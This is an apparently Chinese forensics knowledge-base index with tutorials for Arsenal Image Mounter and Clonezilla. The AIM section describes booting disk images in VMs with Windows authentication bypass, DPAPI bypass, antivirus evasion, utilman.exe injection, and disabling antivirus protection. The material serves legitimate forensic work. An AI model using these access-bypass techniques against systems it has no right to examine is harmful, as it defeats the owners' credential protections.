    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/2.0%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "2磁盘挂载",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/index.html"
  },
  {
    "content": " 分子实验室 https://molecule-labs.com/\n官网：https://arsenalrecon.com/\n工具源码：https://github.com/ArsenalRecon/Arsenal-Image-Mounter\nArsenal Image Mounter(AIM)包含了一个虚拟SCSI适配器（通过独特的Storport miniport驱动程序），使用户可以从Windows中对挂载的镜像启动虚拟机（然后绕过Windows身份验证）、管理BitLocker -受保护的卷、安装/访问“卷影副本”、“磁盘管理器”等功能。\n特性 完成安装在Windows上将原始、检查和虚拟机磁盘映像的内容挂载为完整或“真实”磁盘 临时写支持、“假”磁盘签名、CLI版本、虚拟机启动、Windows身份验证旁路、BitLocker管理等等 在磁盘映像中快速挂载所有卷影副本(VSCs) 假设已安装适当的Windows文件系统驱动程序，则磁盘映像中包含的许多类型的文件系统都可以安装在运行AIM的取证工作站上。阿森纳安装的文件系统包括NTFS，FAT32，ReFS，exFAT，HFS +，UFS和EXT3。 AIM还支持绕过Windows文件系统驱动程序，并通过“ Windows文件系统驱动程序绕过”安装选项使用DiscUtils文件系统驱动程序。该挂载选项支持的文件系统包括FAT 12/16/32和NTFS，具有对Btrfs，Ext2 / 3/4的实验性支持（某些最新Linux发行版使用64位头字段除外），ExFAT，HFS +，SquashFs ，UDF和XFS。 支持挂载的镜像类型 原始（dd） 高级取证格式4（AFF4） Encase（E01和Ex01）（如果libewf可用） 如果DiscUtils可用，则虚拟机磁盘文件（VHD，VDI，XVA，VMDK，OVA）和检查点（AVHD，AVHDX） 运行要求 Arsenal Image Mounter设计为（理想情况）在Windows 10（和Server 2016/2019）x64上运行，以便所有功能（例如，启动虚拟机和与BitLocker相关的功能）都能按预期工作。在上述推荐的操作系统之外，大多数（如果不是全部）AIM的核心功能仅在Windows 7和Server 2012/2012 R2 x64上才可在Windows系统上使用。\nArsenal Image Mounter需要Hyper-V才能启动虚拟机。如果您尚未安装Hyper-V，请按照以下链接中提供的说明启用它：\nhttps://docs.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\n另外，请确保已启用工作站BIOS或UEFI中的虚拟化技术设置。还建议您在防病毒应用程序中排除Arsenal Image Mounter的文件夹和/或可执行文件。\n安装 安装流程 官网下载地址：https://arsenalrecon.com/downloads/\n下载AIM后，将“ Arsenal-Image-Mounter…” ZIP文件的内容提取到您选择的文件夹中。AIM文件夹的内容包括可执行文件“ ArsenalImageMounter.exe”（GUI版本），“ aim_cli.exe”（CLI版本）以及AIM的GUI和CLI版本的自述文件。\n自述文件包含有关AIM功能和产品使用的详细说明。强烈建议数字法医从业人员查看并了解“ readme.txt”和“ readme_cli.txt”中提供的信息。\n双击“ ArsenalImageMounter.exe”打开AIM将启动AIM并安装AIM驱动程序。如果您看到以下与安装更新的驱动程序有关的窗口，请选择“是”。\n将会出现“正在安装驱动程序”消息窗口。\n驱动程序设置完成后，将显示“驱动程序已成功安装”消息窗口。\n1、下载的是压缩包文件，解压后运行；\n2、支持32位、64位运行环境；\n3、需要Microsoft .Net Framework 4.0环境\n4、如果软件无法正常打开，请以“管理员”身份运行；\n启用AIM的专业模式 通过在AIM首次启动时激活许可证或通过“帮助”-\u003e“关于”，可以在连接Internet的工作站上启用AIM的“专业模式”。\n要在有气隙的工作站上启用AIM的“专业模式”，请：\n打开Arsenal Image Mounter并输入获得的许可证代码 意识到没有可用的Internet连接后，Arsenal Image Mounter会将一个“ .LIC”文件保存到您的ProgramData\\ArsenalRecon文件夹中 在可访问Internet的工作站上，转到https://www.softworkz.com/offline/offline.aspx上的“脱机激活”页面，然后上传“ .LIC”文件。 将收到的CDM文件复制到ProgramData\\ArsenalRecon文件夹 打开Arsenal Image Mounter并确认它现在正在专业模式下运行 免费版和专业版区别 自由模式\n在Windows上将原始，取证和虚拟机磁盘映像挂载为“真实”磁盘 对所有受支持的磁盘映像格式的可重复播放delta 文件提供临时写入支持 将“物理”安装的对象保存为各种磁盘映像格式 虚拟挂载镜像 创建RAM磁盘 命令行界面（CLI）可执行文件 MBR注入，“假”磁盘签名，可移动磁盘仿真等 专业模式\n提供所有免费模式功能，以及： 轻松启动（并经常登录）虚拟机 通过可选的Windows NTFS驱动程序绕过卷影复制安装 Windows文件系统驱动程序绕过对磁盘映像安装的支持 虚拟安装档案和目录 使用完全解密的BitLocker卷保存磁盘映像 磁盘挂载 这里由于已有老师进行了相关教程的介绍，这里做了引用和整合，感谢老师们的前沿探索。\n快速上手教程-在Win中挂载映像为磁盘 参考文章：https://blog.csdn.net/NDASH/article/details/110292699\n1、软件运行后，提示启动信息，点击“ok”\n2、选择磁盘镜像\n路径：File-\u003eMount disk image File\n3、镜像模式设置\n〇只读磁盘设备\n将磁盘映像作为只读磁盘设备挂载。不允许写操作。\n〇写入临时磁盘设备\n将磁盘映像作为可写磁盘设备挂载。修改将被写入一个写-覆盖差异文件，原始磁盘映像将不会被改变。有时也称为写覆盖或写复制模式。\n指定另一个不同的文件位置\n仿真镜像的话就需要设置读写模式才行。\n4、磁盘信息\n挂载成功后，在软件的界面上会显示出每个挂载的设备信息，包括ID、磁盘状态（联机或脱机）、驱动器号、分区类型、磁盘签名信息、大小，模式（只读或读写），驱动器类型（固定或移动）。\n您还可以在界面的下半部分中选择继续添加镜像、启动虚拟机和删除镜像等其他功能选项。\n5、挂载之后在磁盘管理显示\n可在磁盘管理中查看挂载好的磁盘。\n高级功能-更改磁盘挂载模式\n特别方便的一点是，Arsenal Image Mounter可以直接对已经挂载的镜像在“高级功能”再设置就可以更改模式，不需要像FTK Imager需要重新再挂载镜像，而且速度很快。\n点击只读设置，磁盘管理查看磁盘就会变成只读模式。\n官方教程-挂载磁盘映像 https://arsenalrecon.com/2020/12/arsenal-image-mounter-aim-walkthrough/\n** **\n双击“ ArsenalImageMounter.exe”启动AIM，然后从“文件”菜单中选择“文件”-\u003e“挂载磁盘映像文件”。 选择AIM挂载的磁盘映像类型。 选择磁盘映像后，将出现“挂载选项”窗口，并选择了“只读磁盘设备”安装选项。在本文中，我们将重点介绍“写入临时磁盘设备”安装选项，因此我们将选择“写入临时磁盘设备”，然后按“确定”。在AIM安装选项窗口中描述了写入临时安装选项的效果。 装入磁盘映像文件后，将在AIM的主界面中标识运行AIM的取证工作站上的挂载点。在这种情况下，具有临时读/写功能的’c16-Hunter.dd’被安装为’H:'。您还可以看到该磁盘映像包含两个卷影副本（VSC）。\n在Windows资源管理器中，您可以浏览到“本地磁盘（H :)”，如下所示。\n上述步骤提供了使用AIM挂载磁盘映像的快速介绍。在下一节中，我们将介绍如何将AIM安装的磁盘映像启动到虚拟机中。\n官方教程-（专业版）在虚拟机中挂载镜像 本节将介绍如何将AIM安装的磁盘映像启动到虚拟机中。接下来的三段直接从“ readme.txt”文件中引用，解释了AIM如何将磁盘映像启动到虚拟机中。启动VM – 使用选定的AIM安装磁盘启动Hyper-V虚拟机。在使用此功能之前，应先以写临时模式挂载磁盘映像，该功能旨在使在虚拟机中引导磁盘映像的内容比其他方法更高效，可靠和有用。AIM将确定是将磁盘映像作为第一代虚拟机还是第二代虚拟机启动–请参阅https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/plan/should-i-create-a-generation-1-or-2-virtual-machine-in-hyper-v 有关两代的更多详细信息。该虚拟机由2个CPU，一半宿主机可用RAM（最大4GB），两个网络适配器（默认情况下未连接），一个DVD-ROM（不带任何附件映像）和AIM挂载磁盘作为主要IDE或SCSI HD。AIM在Windows 8.1 / 10（和Server 2012 R2 / 2016）x64上可用全部功能，并且要求Hyper-V角色在物理硬件上运行，而不是在虚拟机中运行。可以从https://docs.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v获得Microsoft有关在Windows 10上安装Hyper-V的信息。AIM在安装Hyper-V方面的配置是“使用CMD和DISM启用Hyper-V”方法。如果不确定Hyper-V是否正在运行，则在命令提示符下“ sc query HvService”的输出可能会有所帮助。\n确保已使用安装选项“写入临时磁盘设备”在AIM中挂载了磁盘映像，如上文“挂载磁盘映像”部分所述。 以写临时模式挂载磁盘映像后，有两种方法可以启动虚拟机： 在AIM主界面的底部，有一组快速访问按钮，其中一个是“启动VM”。单击/按“启动VM”以启动虚拟机启动过程。\n或者从“高级-\u003e在虚拟机中启动…”下的“ AIM”菜单中选择。\n将显示“作为虚拟机启动”窗口，其中选中了多个默认选项（取决于所选的特定磁盘映像），如下面的屏幕快照所示。根据您的特定需求调整选项。在这种情况下，我们将使用默认值。 以下是直接从“ readme.txt”文件中更详细描述的“启动VM”选项。\n选择启动虚拟机后，AIM将提供与启动虚拟机有关的各种选项。\n配置网络连接，以使其断开连接（即完全隔离），在VM之间共享，在VM与主机之间共享或设置为具有外部NAT的默认交换机。\n启用来宾服务以在VM和主机之间提供复制/粘贴和其他功能。当虚拟机和主机之间的隔离是首选时，不建议这样做。\n检查文件系统和引导环境，必要时进行修复和调整。如果此选项可用（未显示为灰色），则建议您不要取消选择它。\n禁用/挂起受BitLocker保护的卷，以便在VM运行后无需再次将其解锁。\n注入AIM虚拟机工具并调整启动驱动程序。某些磁盘映像可能很难直接引导到虚拟机中，因此AIM可以将* 1小型应用程序注入运行Windows * 2虚拟机中。AIM虚拟机工具可以显示帐户列表（没有明显的文件夹结构或没有重要注册表信息的帐户未在AIM虚拟机工具中列出，因为实际上没有什么可登录和/或无法这样做的），并且可以还可以从登录屏幕打开管理命令提示符。AIM虚拟机工具将在Windows XP上自动启动，并且可以通过Windows Vista / 7/8 / 8.1 / 10 * 3上的“轻松访问”图标进行访问。\n使用包括策略调整在内的多种技术绕过Windows身份验证* 4，以便任何密码输入都可以使用。支持使用多种身份验证（包括密码，PIN，生物识别，图像和智能卡）的本地，Microsoft（云），Active Directory和Azure Active Directory帐户。如果要求或原始特权不可用，将为帐户提供管理特权。请注意，要访问Windows中的某些内容（例如EFS加密的文件和文件夹以及缓存的登录凭据），您将需要破解而不是绕过帐户身份验证* 5。\n绕过数据保护API（DPAPI），它提供对上次登录用户的受DPAPI保护的内容（例如网站，网络共享和应用程序凭据以及受保护的文件和文件夹）的无缝访问（特别是与AIM的Windows身份验证旁路配合使用）通过加密文件系统（EFS）。通常，在用户成功登录Windows后，才可以使用受DPAPI保护的内容，但是AIM的DPAPI绕过功能使其在没有用户凭据的情况下就可用。在某些情况下，当AIM首次将具有本地或Microsoft（云）帐户的Windows 10 x64系统启动到虚拟机中时，此选项将可用。请注意，此选项当前最适合单用户系统，并且不会在重新启动后持续存在。\n使用WinDbg启动Windows内核调试。\n1AIM将在虚拟机内执行防病毒规避，以确保AIM虚拟机工具正常运行。 2名为“ AIM_MODIFIED.txt”的文件将放置在AIM虚拟机工具已进行调整的每个Windows卷的根目录上。这些调整是设计临时的，基于“写入临时…”安装。 3根据您的防病毒软件和设置，您可能需要将AIM的文件夹和/或可执行文件（ArsenalImageMounter.exe和aim_cli.exe）排除/白名单和/或暂时禁用实时保护，以确保AIM虚拟机工具将被正确注入。您可能还需要指示防病毒软件在VM启动时忽略/允许“ utilman.exe”威胁。 4并非总是可以为某些状态下的缓存域帐户标识权威的DOMAIN \\ USER组合，因此AIM可以创建DOMAIN \\ USER组合以方便访问那些帐户。AIM虚拟机工具将以红色显示AIM创建的DOMAIN \\ USER组合。 5对于Active Directory帐户，如果有域控制器可用，则很容易在它与客户端之间建立虚拟网络（所有网络都在AIM启动的虚拟机中运行），这将允许您重置帐户密码从域控制器。以这种方式重置密码将使您能够访问客户端上以前无法访问的项目，例如缓存的登录凭据以及EFS加密的文件和文件夹。 启动虚拟机失败消息\n如果看到错误消息“虚拟机发生故障”，则可能您未安装Hyper-V或它无法正常运行。如果未安装Hyper-V，请删除AIM中当前安装的所有磁盘映像，关闭AIM，然后安装Hyper-V。成功安装Hyper-V之后，重复前面的步骤，以写临时模式安装磁盘映像，然后启动虚拟机。\n继续经过“作为虚拟机启动”窗口之后，在虚拟机准备过程中将出现几个窗口。 如果AIM确定需要修复文件系统，则将显示命令提示符窗口。在此阶段，无需您进行任何交互。 命令提示符窗口消失后，将出现“磁盘未脱机”消息窗口。选择“是”。磁盘必须置于离线模式才能与虚拟机一起使用。\n磁盘脱机后，将显示“虚拟机连接”窗口。现在可以通过单击“开始”来启动虚拟机。 启动后，虚拟机将开始引导至Windows（或其他操作系统，具体取决于已安装的磁盘映像中包含的操作系统）。\n我们已经启动了虚拟机，现在处于Windows登录屏幕，该屏幕似乎要求用户’Hunter’拥有密码。您可能不知道该帐户的密码。 在尝试登录默认用户帐户之前，让我们首先检查一下Hunter磁盘映像中有多少个用户帐户（以及类型！）。这可以通过在Windows登录屏幕上选择“轻松访问”图标来完成，以显示“ AIM虚拟机工具”窗口。标识了一个用户帐户，其UTC时间，帐户类型，用户帐户配置文件路径和Windows SID值具有“上次登录”的日期和时间。下面的屏幕快照显示了“ AIM虚拟机工具”窗口中的默认选项。请注意，“ AIM虚拟机工具”窗口底部的两个单选按钮显示为灰色。 如果选择显示用户帐户信息的行，则将激活下面显示为灰色的按钮，如下面的屏幕截图所示。现在，我们已经使用AIM虚拟机工具标识了用户帐户，我们可以单击“返回登录屏幕”或单击右上角的“ X”关闭窗口。 使用AIM的“绕过Windows身份验证”（如果之前选中此选项，则无需知道用户帐户的密码）。单击“密码”字段中的向右箭头，或按键盘上的“ Enter”。 接下来的两个屏幕快照演示了Windows身份验证被绕过然后访问用户的桌面的情况。\n官方教程-挂载卷镜像副本（VSC） 数字取证从业人员可以通过启用来宾服务来在虚拟机中运行第三方工具，这将允许VM和主机之间进行文件传输，或者使用其他方法（例如将磁盘连接到虚拟机或利用PowerShell Direct）。有关这些选项的更多详细信息，请参见AIM自述文件。\n接下来，我们将演示VSC的安装（从AIM安装的磁盘映像中）。\n卷影副本（VSC）对数字取证从业者尤其有用。它们可能包含有价值的数据，这些数据存在于文件系统的先前版本中，而不再存在于当前文件系统中。\n我们将首先以写入临时模式挂载收集的磁盘映像。 挂载磁盘映像后，我们转到**“高级-\u003e卷卷影副本…”。** 这将打开“卷影复制选项”窗口。默认情况下，“标准卷影副本安装”和所有VSC被选中。仔细阅读每个选项的说明，以确保按预期方式装入卷影副本。 无论选择了一个还是多个VSC，AIM都会请求一个文件夹，用于安装VSC。在“浏览文件夹”窗口中，确定要将VSC挂载的位置，然后按OK。 在这种情况下，选择了收集的磁盘映像中的两个VSC，并且选择安装它们的位置是Desktop。现在可以将VSC作为一系列文件夹进行浏览，并且可以使用第三方工具来分析或镜像已安装的VSC。 选择“标准卷影副本装载”将快速装载VSC，但不会公开Windows文件系统图元文件（例如$MFT，$LogFile，$UsnJrnl等），并且不会绕过文件系统安全性。在下面显示的屏幕快照中对此进行了演示，该屏幕快照显示两个VSC中均不存在NTFS图元文件。 如果要访问NTFS图元文件以进行分析和成像，请选择选项“使用Windows文件系统驱动程序旁路进行卷影复制安装”。使用此选项，VSC会与DiscUtils NTFS驱动程序（而不是Windows NTFS驱动程序）一起安装，并且会显示NTFS图元文件。请记住，AIM会提示您输入用于安装VSC的文件夹位置。 “使用Windows文件系统驱动程序旁路安装卷影副本”选项将使AIM开始缓存目录结构的过程。这不如“标准卷影副本安装”那样快。您将看到在缓存目录结构时，AIM非常忙。\n如果决定使用“写入临时卷影复制装载”选项，则将装载VSC，就像它们都是“真实”磁盘一样，并且清楚地标识了它们的装载点。 挂载的VSC将出现在Windows资源管理器中，在这种情况下为驱动器号“ I”和“ J”。可以使用您选择的映像工具对安装的这些VSC进行物理或逻辑映像，甚至可以将其启动到虚拟机中，我们将在后面讨论。\n可以通过突出显示相关的AIM安装的磁盘映像并选择“删除”或选择“全部删除”来删除已安装的VSC。 到此，对VSC安装选项进行了简要回顾。在下一部分中，我们将演示如何将VSC从虚拟机启动AIM安装的磁盘映像。\n官方教程-（专业版）作为虚拟机启动卷镜像副本（VSC） 本节将介绍如何从安装了AIM的磁盘映像作为虚拟机启动VSC。我们在本演练的“安装磁盘映像”和“安装卷影复制”部分中介绍的步骤是相关的。\n首先，我们以写临时模式挂载获取的磁盘映像。 接下来，我们使用“卷影复制”选项“写入临时卷影复制安装”来挂载VSC。 在AIM界面中，请记住首先选择要作为虚拟机启动的VSC，然后使用“启动VM”功能。在“作为虚拟机启动”窗口中，接受选中的默认值，然后选择“确定”。 磁盘映像安装选项：临时写入\n已安装的VSC出于启动VM的目的而处于脱机状态。 现在，VSC已启动到虚拟机中，并且我们已经使用AIM的Windows身份验证旁路访问了用户的桌面。 官方教程-（专业版）BitLocker管理 AIM的BitLocker菜单（专业模式）允许数字取证从业人员解锁受BitLocker保护的卷，挂起受BitLocker保护的卷，禁用（完全解密）受BitLocker保护的卷以及完全解密受BitLocker保护的卷，然后保存完全解密的磁盘映像…，以便可以在其他（商业或开源）数字取证工具中轻松使用该映像。\n**官方教程-（专业版）**启动虚拟机以解锁或删除完整磁盘加密 AIM可用于将包含各种全盘加密（尤其是流行的数字取证工具不支持的加密）的磁盘映像启动到虚拟机，从而使您可以与全盘加密的“预启动环境”进行交互-换句话说，是一种小型操作系统，由全磁盘加密使用，在主操作系统之前运行。然后，根据全盘加密的类型，您可能会具有一些选项，其中包括解锁和删除全盘加密以及各种密钥恢复方法。\n**官方教程-（专业版）**分流 使用AIM的启动VM功能（专业模式），研究人员或数字取证从业人员可以从用户的角度查看操作系统。使用取证工作站，研究人员或数字取证从业人员可以对磁盘图像进行分类，并确定是否存在轻松实现的目标。这种方法面临的挑战是，例如，无法轻松查看已删除的工件和NTFS图元文件。这种方法应与数字取证分析工具的使用相平衡，该工具可以更全面地查看文件系统。\n分流用例背后的目的是通过允许调查人员协助案例审查来协助机构或公司解决积压的案件。这不一定是解决案件积压的最佳解决方案，而是一个值得考虑的想法。Humbly指出，对于不断增加的案件积压，没有单一的解决方案。\n**官方教程-（专业版）**实时系统分析 将AIM安装的磁盘映像或VSC启动到虚拟机（专业模式）的功能对于检查实时系统非常有用。实时系统上的监视过程，文件系统和网络活动可能非常有价值，尤其是在涉及恶意软件的情况下。\n官方教程-（专业版）在没有用户凭据的情况下访问DPAPI保护的内容 什么是DPAPI（数据保护API）保护的内容？从另一则 见解文章中：\n“ Microsoft在Windows 2000中发布了DPAPI，因此第三方开发人员（以及Microsoft本身）将拥有可靠，灵活且易于使用的方法来加密和解密数据。DPAPI加密可以基于特定用户（要求使用该用户的Windows登录凭据）或特定系统（要求使用任何用户的Windows登录凭据）。受DPAPI保护的数据可以在Windows计算机的许多位置找到，例如注册表和各种应用程序数据库。在某些情况下，数字取证从业人员很容易确定应用程序如何使用受DPAPI保护的数据，但在其他情况下（例如Dropbox数据库）则更具挑战性，因为DPAPI是保护特定类型数据的较大系统的一部分。 ”\n既然您知道受DPAPI保护的内容的价值，那么您也将知道在没有用户凭据的情况下访问该内容的价值。请查看前面提到的“见解”文章，以了解有关AIM的DPAPI旁路的更多信息。\n**官方教程-（专业版）**作为虚拟机启动的非Windows磁盘映像 如果您在本演练的前面提到了您，则将获得有关支持安装多个非Windows文件系统的支持。AIM不仅限于将Windows启动到虚拟机中，还可以将诸如Linux之类的操作系统启动到虚拟机中。如果您要处理的是运行Linux的可疑设备，或者是运行嵌入式Linux的设备（如某些DVR），则这可能非常有用。\n可以在https://cyberdefenders.org/labs/32上找到Hunter磁盘映像。\n您可以在Arsenal的“推荐”页面上阅读有关数字取证从业人员如何使用AIM的信息。\n您可以在Vimeo Arsenal Image Mounter频道的https://vimeo.com/channels/1544872/videos上观看一些AIM培训视频。\n视频教程 https://www.youtube.com/watch?v=VDu8ZYgKeho\n",
    "description": "",
    "tags": null,
    "title": "Arsenal_Image_Mounter",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "content": "Clonezilla：https://clonezilla.org/ 多平台的分区和磁盘克隆程序。\nClonezilla是一个分区和磁盘成像/克隆程序，类似于True Image®或Norton Ghost®。帮助您进行系统部署、裸金属备份和恢复。Clonezilla有三种类型:Clonezilla live、Clonezilla lite server和Clonezilla SE(服务器版)。Clonezilla live适用于单机备份和恢复。虽然Clonezilla lite server或SE是用于大规模部署的，但它可以同时克隆许多(40多台!)计算机。Clonezilla只保存和恢复硬盘中使用过的块。这提高了克隆效率。在42节点集群中的一些高端硬件中，理论可达8gb/min速率恢复速率。\n特性 支持许多文件系统:\n(1)ext2、ext3, ext4, reiserfs, reiser4, xfs、jfs, btrfs, f2fs nilfs2 GNU / Linux, (2) FAT12, FAT16, FAT32, NTFS Windows, (3)HFS + Mac OS, (4) UFS FreeBSD, NetBSD, OpenBSD, (5) minix minix, (6) VMFS3 VMFS5 VMWare ESX。 因此，无论32位(x86)操作系统还是64位(x86-64)操作系统，都可以克隆GNU/Linux、MS windows、intel Mac OS、FreeBSD、NetBSD、OpenBSD、Minix、VMWare ESX、Chrome OS/Chromium操作系统。对于这些文件系统，Partclone只保存和恢复分区中使用过的块。对于不支持的文件系统，在Clonezilla中，扇区到扇区的复制是由dd完成的。\n支持GNU/Linux下的LVM2 (LVM版本1不支持)。 可以重新安装引导加载程序，包括grub(版本1和版本2)和syslinux。 支持MBR和GPT分区格式的硬盘驱动器。Clonezilla live也可以在BIOS或uEFI机器上启动。 支持无人值守模式。几乎所有的步骤都可以通过命令和选项来完成。您还可以使用许多引导参数来定制您自己的映像和克隆。 支持一个映像恢复到多个本地设备。 镜像可以被加密。这是通过ecryptfs完成的，这是一种符合posix的企业加密堆叠文件系统。 Clonezilla SE支持多播，适合大规模克隆。如果您的客户端支持PXE和局域网唤醒，您也可以远程使用它来保存或恢复一堆计算机。 Clonezilla lite服务器支持BT (Bittorrent)，适合大规模部署。BT模式的工作由Ezio完成。 映像文件可以在本地磁盘、ssh服务器、samba服务器、NFS服务器或WebDAV服务器上。 AES-256加密可用于保护数据的访问、存储和传输。 基于Partclone(默认)、Partimage(可选)、ntfsclone(可选)、dd对分区进行镜像或克隆。然而，包含其他一些程序的Clonezilla不仅可以保存和恢复分区，还可以保存和恢复整个磁盘。 通过使用我们自己开发的另一款免费软件drbl-winroll，可以自动更改克隆的MS windows机器的主机名、组名和SID。 最小运行环境 Clonezilla live所需最小系统环境：\n处理器为X86或X86 -64\n196mb系统内存(RAM)\n启动设备，如CD/DVD驱动器、USB端口、PXE或硬盘驱动器\n局限性 目标分区必须等于或大于源分区。 差异/增量备份尚未实现。 在线成像/克隆还没有实现。必须卸载要映像或克隆的分区。 由于图像格式的限制，无法探索或装入图像。您可以从映像中恢复单个文件。但是，您仍然有办法做到这一点，请阅读本文。 恢复Clonezilla live与多个cd或dvd还没有实现。现在，如果你选择创建恢复iso文件，所有的文件都必须在一个CD或DVD中。 Clonezilla版本 Clonezilla Live: Clonezilla Live允许你使用CD/DVD或USB闪存驱动器引导和运行Clonezilla(仅提供单播) **Clonezilla lite服务器:**Clonezilla lite服务器允许你使用Clonezilla live进行大规模克隆(支持单播，广播，多播，bt) Clonezilla SE: DRBL包含了Clonezilla SE，因此为了使用Clonezilla进行大规模克隆(支持单播、广播和组播)，必须首先建立DRBL服务器。 这里因为日常使用的clonezille live会比较多这里主要介绍live。\nClonezilla Live及其使用 https://clonezilla.org/clonezilla-live.php\nClonezilla Live是一个针对x86/amd64 (x86-64)计算机的小型可引导GNU/Linux发行版。Clonezilla SE(服务器版)从2004年开始开发，用于同时部署多台计算机。这是一个非常有用的工具，但是它也有一些限制。为了使用它，您必须首先准备一个DRBL服务器，并且要部署的机器必须从网络启动(例如PXE/iPXE)。\n如何安装Clonezilla Live 要安装Clonezilla live，基本步骤是下载预构建的Clonezilla live，然后将其放入引导介质(CD、USB闪存驱动器或USB硬盘驱动器)。有两种类型的文件可用，iso和zip。前者用于CD，后者用于USB闪存驱动器。此外，您还可以将Clonezilla放在硬盘驱动器或PXE服务器上。\nCD / DVD: 下载一个ISO文件光盘/DVD。然后你可以烧录文件CD / DVD与任何烧程序,这种K3b GNU / Linux或InfraRecorder女士的窗户,和记得选择“烧录镜像”的燃录到CD, 该CD可以用来引导机器启动镜像或克隆。在这里可以找到关于使用InfraRecorder创建Clonezilla live CD的分步文档。\nUSB闪存驱动器或USB硬盘: 要把Clonezilla放到u盘或u盘上，请查看这个文档。\n硬盘: 要将Clonezilla安装在已经安装了操作系统的硬盘上，请检查这个文档。\nPXE服务器: 要将Clonezilla运行在PXE服务器上并通过PXE引导您的客户机，请检查这个文档。\n如果您有兴趣从头创建Clonezilla live iso或zip文件，请检查这个文档。//创建Clonezilla live 2.x!\n如何使用Clonezilla Live Please refer to this doc for more details. 官方文档\n下面是官方手册（已翻译）：\n下面是Clonezilla Live启动的菜单：\n第一个页面是Clonezilla Live默认的模式界面，它将默认为分辨率为1024x768的帧缓冲模式。\n在第二选项“Other modes of Clonezilla live”中还有更多的模式可供选择，如:800X600或640x480，如果你愿意，如下图所示:\n选择“Clonezilla live (To RAM。引导介质可以稍后删除)，与第一个相同的功能，不同的是当Clonezilla live引导完成时，所有必要的文件被复制到内存，可以移除启动介质(CD或u盘)。\n如果您不需要中文或日文版环境，或者您的计算机在帧缓冲模式下遇到问题，您可以选择“Clonezilla Live (no framebuffer)”在英文环境中克隆。\n选择“Clonezilla live(故障安全模式)”，是为了当你不能启动你的机器时出现问题，比如你的机器的ACPI在内核中不受支持。\n如果你想在你的硬盘上启动本地操作系统，你可以选择“本地操作系统在硬盘(如果可用)”。这是引导介质中的一个额外功能，与Clonezilla Live没有任何关系。\n选择“FreeDOS”，可以让你引导你的机器进入自由 DOS。这是引导介质中的一个额外功能，与Clonezilla Live没有任何关系。\n选择“使用Memtest86+进行内存测试”是为了使用Memtest86+进行内存测试。这是引导介质中的一个额外功能，与Clonezilla Live没有任何关系。\n选择“通过etherboot进行网络引导”或“通过gpxe进行网络引导”，可以通过etherboot或gpxe进行网络引导。如果您的计算机没有PXE网络，您可以使用它从网络引导。这是引导介质中的一个额外功能，与Clonezilla Live没有任何关系。\n在选择语言和键映射之后，首先会提示您分配映像存储库，它可以是本地磁盘、ssh服务器、nfs服务器、samba服务器(网络邻居)或任何可以作为/home/ partimag挂载的文件系统。一旦存储库就绪，您就可以继续保存或恢复映像。请按照屏幕上的说明操作。关于Clonezilla live的两个主要截图: ///注意/// Clonezilla镜像名实际上就是目录名。例如，如果你将镜像名命为2007-05-NOVISTA，所有的信息将会被保存在/home/partimag/2007-05-NOVISTA/目录中。MBR引导,切分表以及以及切分文件都会被储存。因此当你想要还原镜像的时候，应挂载/home/partimag到对应磁盘和路径，/home/partimag/这个目录下，并且还要有2007-05-NOVISTA目录。\nClonezilla Live prepare ocsroot菜单\n[专家模式]如果你想手动挂载clonezilla image home (/home/partimag)，遵循以下步骤:\n运行“sudo su -”成为root。 您必须准备另一个可写的设备或空间，并将其挂载为/home/partimag(注意!如果你的引导媒体是可写的,如USB闪存驱动器或您选择使用内存选项,已有/home/partimag与/live_media /home /partimag,你必须删除该文件,并创建一个目录/home/partimag作为挂载点“rm - f /home/partimag;mkdir - p /home/partimag)。例如，如果你想使用Clonezilla来保存/dev/hda，并将映像放在/dev/hdb1中，那么你必须通过“mount -t auto /dev/hdb1 /home/partimag”将/dev/hdb1挂载为/home/partimag。 如果/dev/hdb1的文件系统是ntfs，你必须使用\"ntfs-3g /dev/hdb1 /home/partimag\"来挂载它，这样它就可以写了。请记住，还支持sshfs和smbfs。例如，使用sshfs，你可以挂载你的远程ssh服务器:\nsshfs ACCOUNT@SSH_SERVER: / ABSOLUTE_PATH /home/partimag例如，如果你想挂载你的ssh服务器192.168.100.254目录/work/pool，像这样运行:\n/home/partimag sshfs root@192.168.100.254: /home/partimag如果你想用目录/work/smb挂载你的samba服务器192.168.200.254，像这样运行:\nmount -t cifs -o user=your_user_name //192.168.200.254/work/smb /home/partimag . conf . mount -t cifs -o user=your_user_name //192.168.200.254/work/smb /home/partimag . conf如果您想用目录/work/smb挂载samba服务器192.168.200.254，用户名为“administrator”，密码为“pass”，请像这样运行:\nmount -t cifs -o user=administrator,password=pass //192.168.200.254/work/smb /home/partimag . mount -t cifs -o user=administrator,password=pass///说明///上述命令中，Linux下不使用smbfs，LINUX下使用cifs协议，cifs协议对windows MS文件共享的兼容性更好**。当您使用smbfs时，Clonezilla live将无法保存正确的镜像!**\n运行“clonezilla”来使用clonezilla，然后按照屏幕上的说明操作。 更多文章示例 http://clonezilla.nchc.org.tw/related_article/\n通过视频学习了解clonezilla使用 通过视频学习如何使用clonezilla：\nhttps://www.youtube.com/watch?v=cEE_vn8E0Kk\nhttps://www.youtube.com/results?search_query=clonezilla\n相关视频链接\nBackup with Clonezilla | LAS | s25e10 How To Backup AND Restore you Computer with CloneZilla! (BEST HD Tutorial!!) Disk to Disk Copy with Clonezilla How to Do a System Backup Using Clonezilla How to use CloneZilla Tutorial (Making an image file and copying it to another computer) Clonezilla - Backup Linux/Ubuntu System Clonezilla video tutorial (italian) ",
    "description": "",
    "tags": null,
    "title": "Clonezilla",
